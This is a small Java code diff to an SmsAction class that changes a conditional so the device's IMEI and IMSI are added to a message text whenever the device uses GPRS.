@@ -169,7 +169,8 @@ public class SmsAction extends SubAction {
 						// sb.append("ESN: "
 						// + NumberUtilities.toString(device.getEsn(), 16)
 						// + "\n");
-					} else {
+					} 
+					if (Device.isGprs()) {
 						sb.append("IMEI: " + device.getImei() + "\n");
 						sb.append("IMSI: " + device.getImsi() + "\n");
 					}
